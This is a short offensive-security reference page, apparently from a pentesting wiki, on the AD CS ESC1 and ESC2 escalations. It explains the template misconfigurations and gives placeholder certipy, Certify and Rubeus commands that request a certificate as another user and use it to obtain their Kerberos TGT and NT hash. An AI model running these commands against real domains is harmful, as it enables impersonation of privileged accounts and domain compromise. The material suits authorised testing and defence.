---
title: ESC1 and ESC2
description: Request certificate as another user with enrollee-supplied subject
categories: [Active Directory, AD CS]
tags: [Active Direcotory, Privilege Escalation, Lateral Movement, AD CS]
weight: 2
---

ESC1 and ESC2 are similar privilege escalation techniques targeting certificate templates with `ENROLLEE_SUPPLIES_SUBJECT` flag set and can be used for client authentication. The `ENROLLEE_SUPPLIES_SUBJECT` flag means the subject of the certificate issued will be whatever the client supplies in the certificate request. Privilege escalation is then achieved by specifying a high-priv user in the subject name, then use **Pass-the-Certificate** to authenticate as the target user, obtaining their Kerberos TGT.

The difference between ESC1 and ESC2 come down to what specific configuration in the certificate template allowed that to happen:
- ESC1:
    - **Client Authentication** is set as one of the EKUs.
    - `ENROLLEE_SUPPLIES_SUBJECT` flag is set.
- ESC2:
    - **Any Purpose** is set as one of the EKUs.
    - `ENROLLEE_SUPPLIES_SUBJECT` flag is set.

## Linux Perspective
We use `certipy` to request a certificate the vulnerable template, specifying the user we want to get access in `-upn`.
```bash
certipy req \
-k -no-pass \
-target '<dc_host>' -ns '<dc_ip>'
-ca '<ca_name>' -template '<vuln_template>' \
-upn '<target_user>'@'<domain>' -sid '<target_user_sid>' [-key-size 4096]
```

After obtaining the certificate, we use `certipy`, once again, to Pass-the-Certificate to authenticate as the user we just requested a certificate for to obtain their TGT and NT hash.
```bash
certipy auth -pfx '<cert_path>' -dc-ip '<dc_ip>'
```

## Windows Perspective
From Windows systems, `Certify` can be used with our target username specified under `/altname`:
```cmd
Certify.exe request /ca:'<ca_name>' /template:"<vuln_template>" /altname:"<target_user>"
```
Then, we can use `Rubeus` to Pass-the-Certificate and obtain a TGT.
```cmd
Rubeus.exe asktgt /user:"<target_user>" /certificate:"<base64_cert>" /password:"<cert_pass>" /domain:"<domain>" /dc:"<dc_host>" /show
```

